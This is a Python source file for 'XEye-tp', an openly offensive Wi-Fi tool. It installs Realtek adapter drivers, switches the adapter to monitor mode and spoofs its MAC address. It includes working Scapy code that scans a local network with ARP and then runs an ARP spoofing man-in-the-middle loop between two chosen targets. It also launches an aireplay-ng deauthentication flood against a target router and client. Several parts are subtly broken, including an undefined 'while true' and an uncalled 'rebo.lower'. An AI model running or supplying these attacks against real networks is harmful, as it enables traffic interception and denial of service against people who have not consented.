#! /usr/bin/env python3
# XEye-tp is only developed by Mostafa Ahmad, The XEye(XEyecs.com) founder, Cybersecurity Expert and Senior Penetration Tester.
import subprocess, os, re, time
import scapy.all as sc
time.sleep(2)
def udte():
    print("\n[Info] --> Checking for updates, please wait .....\n\n")
    time.sleep(1)
    chupd = subprocess.check_output(['git','pull'])
    chked = re.search(r"Already up to date", str(chupd))
    chkeds = re.search(r"actualizado", str(chupd))
    bupted = re.search(r"changed,", str(chupd))
    if chked or chkeds:
        print("\n[Congrats] --> XEye-tp is up to date")
        time.sleep(1)
        print("[Warning] --> We are updating XEye-tp for better performance and more hacking features, if you need help please send us a msg on \"https://fb.com/xeyecs\" .... ")
        time.sleep(3)
        Start()
    else:
        print("\n[Info] --> XEye-tp will be updated, please wait ...... \n")
        time.sleep(3)
        if bupted:
            print("\n[Congrats] --> XEye-tp is updated. ")
            time.sleep(1)
            print("[Instruction] --> Please rerun XEye-tp and updates will take effect. ")
            exit()
        else:
            print("\n[Warning] --> XEye-tp couldn't be updated, please try again or reclone the tool ")
            exit()
def Checkroot():
    who = subprocess.check_output('whoami')
    pdir = subprocess.check_output('pwd')
    chuser = re.search(r"root", str(who))
    chdir = re.search(r"XEye-tp", str(pdir))
    if chuser and os.getuid() == 0:
        if chdir:
            udte()
        else:
            print("[Warning] --> the PWD is not XEye-tp - Exiting .....")
            time.sleep(1)
            print("[Support] --> If you need help, please let us know through our fb page \"https://fb.com/XEyecs\"")
            exit(2)
    else:
        print("\n\n [Warning] --> You are not root - Please run \"sudo su\" command. \n ")
        print("\n[Support] --> IF you need any help, please let us know through our fb page \"https://fb.com/XEyecs\"")
def Start():
    print("\n\n\t\t\t\t\t******XEye******XEye******XEye******XEye******XEye******XEye******XEye******\n")
    print("\t\t\t\t\t\t\t\t [Welcoming] --> Welcome to XEye-tp :) ")
    print("\t\tXEye-tp is made with love by XEye Cybercecurity company and developed by ENG.Mostafa Ahmad ")
    print("\tSubscribe to XEye YT channel: \"https://www.youtube.com/c/XEyecs\" ")
    time.sleep(1)
    Intf = getinterf() #issue needs to be fixed here.
    #print("\n\n[Info] --> A TP-Link USB WIFI adapter is detected \n\n")
    ifconfig_outp = subprocess.getoutput("iwconfig "+str(Intf))
    chwlan = re.search(r"Mode:Managed", str(ifconfig_outp))
    chwlann = re.search(r"Mode:Auto", str(ifconfig_outp))
    chwlannn = re.search(r"Mode:Monitor", str(ifconfig_outp))
    chifasso = re.search(r"unassociated", str(ifconfig_outp))
    if chwlannn:
        lines()
        print("\n [Info] --> Your WiFi USB adapter is already set to Monitor mode ")
        Asking = input("\n [Mac Changer] --> Would like to change your adapter Mac address? [yes / no] ")
        lines()
        while True:
            if Asking.lower() == 'yes' or Asking.lower() == 'y' or Asking.lower() == 'no' or Asking.lower() == 'n':
                break
            else:
                invalid()
                time.sleep(1)
                Asking = input("\n [Mac Changer] --> Would like to change your adapter Mac address? [yes / no] ")
                
        if Asking.lower() == 'y' or Asking.lower() == 'yes':
            Usermd()
        elif Asking.lower() == 'n' or Asking.lower() == 'no':
            lines()
            askingg = input("\n [Deauth Attack] Would you like to perform deauthentication attack? [yes / no] ")
            while True:
                if askingg.lower() == 'yes' or askingg.lower() == 'y' or askingg.lower() == 'no' or askingg.lower() == 'n':
                    break
                else:
                    invalid()
                    time.sleep(1)
                    askingg = input("\n [Deauth Attack] Would you like to perform deauthentication attack? [yes / no] ")
            if askingg.lower() == 'y' or askingg.lower() == 'yes':
                deauth()
            elif askingg.lower() == 'n' or askingg.lower() == 'no':
                defau = input("\n [Reset] --> If you want to reset your adapter, you just need to reboot your OS - Reboot now? [yes/no] ")
                while True:
                    if defau.lower() == 'yes' or defau.lower() == 'y' or defau.lower() == 'no' or defau.lower() == 'n':
                        break
                    else:
                        invalid()
                        time.sleep(1)
                        defau = input("\n [Reset] --> If you want to reset your adapter, you just need to reboot your OS - Reboot now? [yes/no] ")             
                if defau.lower() == 'yes' or defau.lower() == 'y':
                    print("\n [Attention] --> We are rebooting your OS in 20 seconds, you can cancel by pressing on the left \"ctrl+c\" ")
                    time.sleep(20)
                    subprocess.call("sudo reboot", shell=True)
                elif defau.lower() == 'no' or defau.lower() == 'n':
                    print("\n [*] --> Thanks for using XEye-tp tool, Your Adapter is just set to Monitor mode - Bye bye .....\n")
                    TheEnd()
    elif chwlann:
        lines()
        print("\n [Info] --> Your WiFi USB adapter is already set to Auto mode ")
        asking = input(" [Permission] --> Would you like to set your WiFi USB adapter to \"Monitor mode now\" or \"reconfigure\"?  [set / reconf] ")
        lines()
        while true:
            lines()
            if asking.lower() == 'set' or asking.lower() == 'reconf':
                break
            else:
                invalid()
                time.sleep(1)
                asking = input(" [Permission] --> Would you like to set your WiFi USB adapter to \"Monitor mode now\" or \"reconfigure\"?  [set / reconf] ")
        if asking.lower() == 'set':
           print("[*] --> Please wait ...... ")
           tp_set()
        elif asking.lower() == 'reconf':
           tp_conf()
    elif chifasso is None:
        print( " [Info] --> Your adapter \""+str(Intf)+"\" is connected to a network. ")
        time.sleep(1)
        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/XEyecs")
        time.sleep(1)
        asking = input("\n [Permission] --> Would you like to grab the mac addresses of the devices on the network? [yes/no] ")
        while True:
            if asking.lower() == 'yes' or asking.lower() == 'y' or asking.lower() == 'no' or asking.lower() == 'n':
                break
            else:
                invalid()
                time.sleep(1)
                asking = input("\n [Permission] --> Would you like to grab the mac addresses of the devices on the network? [yes/no] ")
        if asking.lower() == 'y' or asking.lower() == 'yes':
            interct()
        elif asking.lower() == 'n' or asking.lower() == 'no':
           print(" [Required] --> Please disconnect from the WiFi network - Exiting :)  ")
           print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/xEyecs")
    elif chwlan:
        usermd()
def usermd():
    lines()
    sque= input("\n [Permission] --> Would you like to proceed? [yes / no] ")
    while True:
        if sque.lower() == 'yes' or sque.lower() == 'y' or sque.lower() == 'no' or sque.lower() == 'n':
            break
        else:
            invalid()
            time.sleep(1)
            sque= input("\n [Permission] --> Would you like to proceed? [yes / no] ")
    if sque.lower() == 'y' or sque.lower() == 'yes':
        tp_conf()
    elif sque.lower() == 'n' or sque.lower() == 'no':
        lines()
        print("\n [*] --> Thanks for using XEye-tp tool, Exiting .....\n")
        TheEnd()
def tp_conf():
    print("\n [*][*][*] --> Updating your system, please wait ....  \n")
    subprocess.call(['apt', 'update', '-y'], stdout=subprocess.DEVNULL)
    print("\n [*][*][*] --> Installing build-essentials, Please wait ....  \n")
    subprocess.call(['apt', 'install', 'build-essential', '-y'], stdout=subprocess.DEVNULL)
    print("\n [*][*][*] --> Installing bc, Won't take too long ....  \n")
    subprocess.call(['apt', 'install', 'bc', '-y'], stdout=subprocess.DEVNULL)
    lines()
    print("\n [*][*][*] --> Removing \"r8188eu.ko module\"  \n")
    subprocess.call(['rmmod', 'r8188eu.ko'], stdout=subprocess.DEVNULL)
    print("\n [*][*][*] --> Installing libelf-dev, Please wait ....  \n")
    subprocess.call(['apt', 'install', 'libelf-dev', '-y'], stdout=subprocess.DEVNULL)
    lines()
    print("\n [*][*][*] --> Installing dkms, please wait ..... ")
    subprocess.call(['sudo','apt', 'install', 'dkms', '-y'], stdout=subprocess.DEVNULL)
    print("\n [*][*][*] --> Done installing dkms. proceeding further ....  \n")
    time.sleep(2)
    lines()
    print("\n [*][*][*] --> Installing the required linux-headers \n")
    subprocess.call("apt install linux-headers-$(uname -r)", shell=True)
    lines()
    print("\n [*][*][*] --> Git cloning the required drivers, Please wait ....... \n")
    unamer = subprocess.check_output(['uname','-r'])
    unamerr = re.search(r"\d.\d\d", str(unamer))
    if unamerr is None:
        subprocess.call(['git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
        os.chdir("rtl8188eus")
        lines()
        #print("\n [*] --> Echoing \"blacklist r8188eu.ko\" to \"realtek.conf\"  \n")
        subprocess.call("echo \"blacklist r8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
        #subprocess.call("echo \"blacklist 8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
    elif unamerr.group(0) >= "5.15":
        subprocess.call(['git', 'clone', 'https://github.com/drygdryg/rtl8188eus.git'], stdout=subprocess.DEVNULL)
        os.chdir("rtl8188eus")
        #subprocess.call("echo \'blacklist r8188eu\'|sudo tee -a \'/etc/modprobe.d/realtek.conf\'", shell=True)
        subprocess.call("echo \"blacklist r8188eu\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
    else:
        subprocess.call(['git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
        os.chdir("rtl8188eus")
        #print("\n [*] --> Echoing \"blacklist r8188eu.ko\" to \"realtek.conf\"  \n")
        subprocess.call("echo \"blacklist r8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
        subprocess.call("echo \"blacklist 8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)    
    print("\n [*][*][*] --> Running Make command, Will take few minutes. Ignore the upcoming errors and warnings ......  \n")
    time.sleep(3)
    subprocess.call(['make'], stdout=subprocess.DEVNULL)
    print("\n [*][*][*] --> Running \"Make Install\" command  \n")
    time.sleep(0.5)
    lines()
    subprocess.call(['make', 'install'], stdout=subprocess.DEVNULL)
    print("\n [*] --> Running \"modprobe 8188eu\"  \n")
    time.sleep(1)
    subprocess.call("modprobe 8188eu", shell=True)
    time.sleep(3)
    iwco = subprocess.check_output(['iwconfig'])
    Auto_check = re.search(r"Mode:Auto", str(iwco))
    if not Auto_check:
        lines()
        print("\n [Warning] --> The WiFi adapter mode is not Auto or it is just missing, don't worry just follow the next instructions to bypass the restriction ")
        print("\n [Info] --> It is normal to see such warnings from time to time as XEye-tp is trying to bypass the restrictions on your adapter. ")
        print(" [Instruction] --> UnPlug and plug in your WiFi USB adapter, WAIT FOR FEW SECONDS then run the tool again and XEye-tp will do the rest :)   \n")
        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://fb.com/xEyecs")
        exit()
    if Auto_check is not None:
        lines()
        print("\n [Congrats] --> The WiFi USB adapter is successfully configured \n")
        asking = input("\n [Permission] --> Would you like to set your WiFi USB adapter to Monitor mode now?  [yes / no] ")
        while True:
            if asking.lower() == 'yes' or asking.lower() == 'y' or asking.lower() == 'no' or asking.lower() == 'n':
                break
            else:
                invalid()
                time.sleep(1)
                asking = input("\n [Permission] --> Would you like to set your WiFi USB adapter to Monitor mode now?  [yes / no] ")
        if asking.lower() == 'y' or asking.lower() == 'yes':
            tp_set()
        elif asking.lower() == 'n' or asking.lower() == 'no':
            lines()
            print("\n [Info] --> Now your adapter is just set to Auto mode - Exiting..... \n")
            TheEnd()
def tp_set():
    interf = getinterf()
    subprocess.call(['sudo','ifconfig', interf, 'down'])
    time.sleep(1)
    subprocess.call("sudo airmon-ng check kill", shell=True)
    time.sleep(1)
    subprocess.call(['sudo','iwconfig', interf, 'mode', 'monitor'])
    subprocess.call(['sudo','ifconfig', interf, 'up'])
    time.sleep(1)
    tp_check()
def tp_check():
    interff = getinterf()
    iwcon = subprocess.getoutput("iwconfig "+str(interff))
    iwcon_Mcheck = re.search(r"Mode:Monitor",str(iwcon))
    if iwcon_Mcheck is not None:
        lines()
        print("\n [Congrats] --> You WiFi USB adapter has been set to monitor mode \n")
        Asking = input("\n [Asking] --> Would you like to change your WiFi adapter Mac address? [yes / no] ")
        while True:
            if Asking.lower() == 'yes' or Asking.lower() == 'y' or Asking.lower() == 'no' or Asking.lower() == 'n':
                break
            else:
                invalid()
                time.sleep(1)
                Asking = input("\n [Asking] --> Would you like to change your WiFi adapter Mac address? [yes / no] ")
        if Asking.lower() == 'y' or Asking.lower() == 'yes':
            Usermd()
        elif Asking.lower() == 'n' or Asking.lower() == 'no':
            askingg = input("\n [Deauth Attack] Would you like to perform deauthentication attack? [yes / no] ")
            while True:
                if askingg.lower() == 'yes' or askingg.lower() == 'y' or askingg.lower() == 'no' or askingg.lower() == 'n':
                    break
                else:
                    invalid()
                    time.sleep(1)
                    askingg = input("\n [Deauth Attack] Would you like to perform deauthentication attack? [yes / no] ")
            if askingg.lower() == 'y' or askingg.lower() == 'yes':
                deauth()
            elif askingg.lower() == 'n' or askingg.lower() == 'no':
                lines()
                print("\n [*] --> Thanks for using XEye-tp tool, Your WiFi Adapter \""+interff+"\" is just set to Monitor mode - Exiting .....\n")
                TheEnd()
    else:
        lines()
        print("\n [Failure] --> Sorry :( , your WiFi USB could not be changed to monitor mode ")
        print("\n [Instructions]--> Please follow the below instructions: ")
        print("\n\t\t\t[1] --> Run the tool again because it might be a technical issue was on your system. ")
        print("\t\t\t[2] --> If the issue persists, simply upgrade and restart your system then run the tool again ")
        print("\t\t\t [3] --> To upgrade your system, just run this command \"sudo apt upgrade -y\" \n ")
        print(" \t\t\t[Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://fb.com/xEyecs")
        exit()
def Usermd():
    Interface = getinterf()
    lines()
    Mac = input("\n [Required] --> Enter the required Mac address: ")
    Macc1 = getmac(Interface)
    while True:
        if not Mac:
            print(" \n [Warning] --> No Mac address was specified. ")
            time.sleep(1)
            Mac = input("\n [Required] --> Enter the required Mac address: ")
        elif Macc1 == Mac:
            print(" \n [Info] --> You just entered the same Mac address for " + Interface + ", please enter a different Mac address ")
            time.sleep(1)
            Mac = input("\n [Required] --> Enter the required Mac address: ")
        else:
            break
    ChMac(Interface, Mac)
    Macc2 = getmac(Interface)
    if (Macc2 == Mac) or (Macc1 != Macc2):
        print(" [Done] --> The Mac address is changed successfully to " + Mac)
        TheEnd()
    else:
        print(" [Warning] --> Something Went wrong, The Mac address couldn't change to "+Mac)
        print("\n [Instruction] --> Enter a valid Mac address, or unplug then plug in you adapter, wait for few seconds then run the tool again ")
        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://fb.com/xEyecs")
        exit()

def ChMac(Interface,Mac):
    print("\n [Info] --> XEye-tp is setting your " + Interface + " Mac address to " + Mac)
    subprocess.call(["ifconfig", Interface, "down"])
    subprocess.call(["iwconfig", Interface, "mode", "Auto"])
    subprocess.call(["ifconfig", Interface, "hw", "ether", Mac])
    subprocess.call(["iwconfig", Interface, "mode", "Monitor"])
    subprocess.call(["ifconfig", Interface, "up"])
def getinterf():
    interfs = subprocess.getoutput('iwconfig |grep WIFI@REALTEK')
    interfso = subprocess.getoutput('iwconfig |grep Access Point')
    interfsoo = subprocess.getoutput('iwconfig |grep eth')
    intero = re.search(r"\w\w\w\w\d", str(interfso))
    interoo = re.search(r"\w\w\w\d", str(interfso))
    interf = re.search(r"\w\w\w\w\d", str(interfs))
    interff = re.search(r"\w\w\w\d", str(interfs))
    enforc = re.search(r"WIFI@REALTEK", str(interfs))
    nenforc = re.search(r"eth\d*", str(interfsoo))
    if interf and enforc:
        print("[Info] --> A TP-Link USB WIFI adapter is detected ")
        return str(interf.group(0))
    elif interff and enforc:
        print("[Info] --> A TP-Link USB WIFI adapter is detected ")
        return interff.group(0)
    elif intero is not None:
        if nenforc:
            if intero.group(0) != nenforc.group(0):
                asko = input("[Info] --> The WiFi interface "+str(intero.group(0))+" is detected which is not TP-Link WN722N, Would you like to proceed? [yes/no] ")
                while True:
                    if asko.lower() == 'yes' or asko.lower() == 'y' or asko.lower() == 'no' or asko.lower() == 'n':
                        break
                    else:
                        invalid()
                        time.sleep(1)
                        asko = input("[Info] --> The WiFi interface "+str(intero.group(0))+" is detected which is not TP-Link WN722N, Would you like to proceed? [yes/no] ")
                if asko.lower() == 'y' or asko.lower() == 'yes':
                    return intero.group(0)
                elif asko.lower() == 'n' or asko.lower() == 'no':
                    print("[Info] --> Non of your adapters changed to Monitor mode by XEye-tp - Exiting ......")
                    exit()
    elif interoo is not None: # start from here
        if nenforc:
            if interoo.group(0) != nenforc.group(0):
                asko = input("[Info] --> The WiFi interface "+str(interoo.group(0))+" is detected which is not TP-Link WN722N, Would you like to proceed? [yes/no] ")
                while True:
                    if asko.lower() == 'yes' or asko.lower() == 'y' or asko.lower() == 'no' or asko.lower() == 'n':
                        break
                    else:
                        invalid()
                        time.sleep(1)
                        asko = input("[Info] --> The WiFi interface "+str(interoo.group(0))+" is detected which is not TP-Link WN722N, Would you like to proceed? [yes/no] ")
                if asko.lower() == 'y' or asko.lower() == 'yes':
                    return intero.group(0)
                elif asko.lower() == 'n' or asko.lower() == 'no':
                    print("[Info] --> Non of your adapters changed to Monitor mode by XEye-tp - Exiting ......")
                    exit()
    else:
        lines()
        print(" [Warning] --> Couldn't detect a WiFi Adapter - please wait .......")
        lsub = subprocess.getoutput('lsusb |grep TL-WN722N')
        lsubs = re.search(r"TL-WN722N", str(lsub))
        time.sleep(2)
        if lsubs:
            print("\n [info] --> The TP-Link WN722N adapter is attached, but it is still not seen as a WiFi adapter. Don't worry we will configure everything for you ......")
            #subprocess.call(['sudo','apt', 'install', 'dkms', '-y'], stdout=subprocess.DEVNULL)
            #print("\n [Instruction] --> The dkms installation is finished, now your system needs to reboot so your adapter will be seen as a WiFi adapter .....")
            rebo = input("\n [Permission] --> Would you like to proceed? [yes/no] ")
            while True:
                if rebo.lower == 'yes' or rebo.lower == 'y' or rebo.lower == 'no' or rebo.lower == 'n':
                    break
                else:
                    invalid()
                    time.sleep(1)
                    rebo = input("\n [Permission] --> Would you like to proceed? [yes/no] ")
            if rebo.lower() == 'yes' or rebo.lower() == 'y':
                print("[Instruction] --> You might need to run the tool again as after XEye-tp configure your system to see the adapter")
                time.sleep(3)
                tp_conf()
                #subprocess.call("reboot", shell=True)
            if rebo.lower() == 'no' or rebo.lower() == 'n':
                print("\n [Info] --> Thanks for using XEye-tp - Exiting ..... ")
                time.sleep(2)
                exit()
        else:
            print(" [Warning] --> Your TP-WN722N adapted is not seen by your system, please make sure that it is attached")
            print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://fb.com/xEyecs")
            exit()
def getmac(interface):
    ifconfgi_re = subprocess.check_output(["ifconfig", interface])
    testing1 = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfgi_re))
    testing2 = re.search(r"\w\w-\w\w-\w\w-\w\w-\w\w-\w\w", str(ifconfgi_re))
    if testing1:
        return testing1.group(0)
    elif testing2:
        mvalue = testing2.group(0)
        Mvalue = re.sub('-',':',mvalue)
        return Mvalue
    else:
        lines()
        print("\n [Warning] --> Please make sure that your adapter is plugged in, then run the tool again and use the set option. - Exiting ..... ")
        time.sleep(2)
        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/xEyecs")
        exit()
def interct():
    ipp = subprocess.getoutput("ip r |grep "+str(getinterf()))
    ipr = subprocess.getoutput(ipp+" | grep proto | cut -d\" \" -f1")
    ip = re.search(r"(?:\d{1,3}\.){3}\d{1,3}(?:/\d\d?)?", str(ipr))
    if ip is not None:
        print(" [Info] --> Scanning your network \"" + ip.group(0) + "\", please wait ......")
        scanning(ip.group(0))
    else:
        print(" [Warning] --> The adapter might be disconnected from the network. Please try again - Exiting ..... ")
        time.sleep(2)
        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/XEyecs")
        exit()
def scanning(ip):
    target = sc.ARP(pdst=ip)
    destmac = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    comb = destmac/target
    gotten = sc.srp(comb,timeout=7,verbose=False)[0]
    ips = []
    for el in gotten:
        gottenips = {"ips":el[1].psrc,"mac":el[1].hwsrc}
        ips.append(gottenips)
        #print("---------------------------------------------------------")
    printr(ips)
def printr(ipss):
    print("\n The IP \t\t The Mac Address\n ---------------------------------------------------------")
    for nn in ipss:
        print(nn["ips"]+"\t\t"+nn["mac"])
    time.sleep(2)
    askii = input("\n\n [Asking] --> Would you like to start ARP spoofing attack? ")
    if askii.lower() == 'y' or askii.lower() == 'yes':
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
        time.sleep(1)
        arpspoof()
    elif askii.lower() == 'n' or askii.lower() == 'no':
        time.sleep(1)
        TheEnd()
    else:
        invalid()
def arpspoof():
    ipo = input("[Required] --> The first target's IP: ")
    iptw = input("[Required] --> The second target's IP: ")
    print("\n[Recommended] --> Clone the XEye-sn sniffer tool through this link \"https://github.com/Engmostafa26/XEye-sn.git\" \n")
    time.sleep(1)
    mact = getm(ipo)
    mactt = getm(iptw)
    integ = 2
    print("[Info] --> ARP Spoofing attack is started ....")
    time.sleep(1)
    print("[Instruction] --> To stop the attack and restore all the targets ARP tables, press on the left \"ctrl+c\" once or more if needed")
    try:
        while True:
            spoofing(ipo, iptw, mact)
            time.sleep(1)
            spoofing(iptw, ipo, mactt)
            print("\r ARP Spoofing packets sent: "+str(integ), end="")
            integ += 2
            time.sleep(1)
    except:
        print("\n\n[Info] --> The attack is stopped, and all the ARP tables will be restored - please wait ....")
        #mact = getm(ipo)
        #macs = getm(iptw)
        packetre = sc.ARP(op=2,hwdst=mact,pdst=ipo,psrc=iptw,hwsrc=mactt)
        sc.send(packetre,verbose=False,count=3)
        packetree = sc.ARP(op=2,hwdst=mactt,pdst=iptw,psrc=ipo,hwsrc=mact)
        sc.send(packetree, verbose=False, count=3)
        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward",shell=True)
        print("[Info] --> All the ARP tables of the targets are restored ")
        time.sleep(2)
        exit()


def getm(ip):
    targetn = sc.ARP(pdst=ip)
    targeth = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    comb = targeth/targetn
    anss = sc.srp(comb,verbose=False,timeout=3)[0]
    return anss[0][1].hwsrc
def spoofing(ipt, ips, macc):
    #mact = getm(ipt)
    #print(mact)
    spacket = sc.ARP(op=2,pdst=ipt,psrc=ips,hwdst=macc)
    sc.send(spacket,count=2,verbose=False)

def invalid():
    print(" [warning] --> Invalid entry, please try again .....")
def deauth():
    Intff = getinterf()
    print("\n [Instruction] --> You need to run \"airodump-ng\" against the targeted network - Your adapter interface name is "+Intff)
    print("\n [Recommendation] --> watch this video \"https://www.youtube.com/watch?v=hiry2h-jB0c\" to know how to use \"airodump-ng\" ")
    dumby = input("\n [Waiting] --> Enter any value and press Enter when you are ready: ")
    if dumby:
        routmac = input(" [Required] --> Please enter the Mac address of the target's access point(router): ")
        climac = input(" [Required] --> Please enter the Mac address of the target's device: ")
        print("\n [Instrucion] --> Make sure that \"airodump-ng\" against the network is running ")
        dumbi = input("\n [Waiting] --> Enter any value and press Enter when you are ready: ")
        if dumbi:
            #packno = input(" [Required] --> Please enter the number of the deauthentication packets to be sent to the target: ")
            print("\n [Info] --> the attack is in action, if you want to stop the attack please press on the left \"ctrl+c\" buttons \n\n\n")
            time.sleep(2)
            subprocess.call(['sudo', 'aireplay-ng', '--deauth', '100000000000000' ,'-a', routmac ,'-c', climac , Intff])
def lines():
    print("-------------------------------------------------------------------------------------------------------")
def TheEnd():
    lines()
    time.sleep(2)
    print("\n [Recommendation] --> Run the \"exit\" command to exit the root shell, and stay secure :) ")
    time.sleep(3)
    print("\n [Author] Eng.Mostafa Ahmad - Cybersecurity Expert and \"XEye\" founder.")
    exit()
Checkroot()
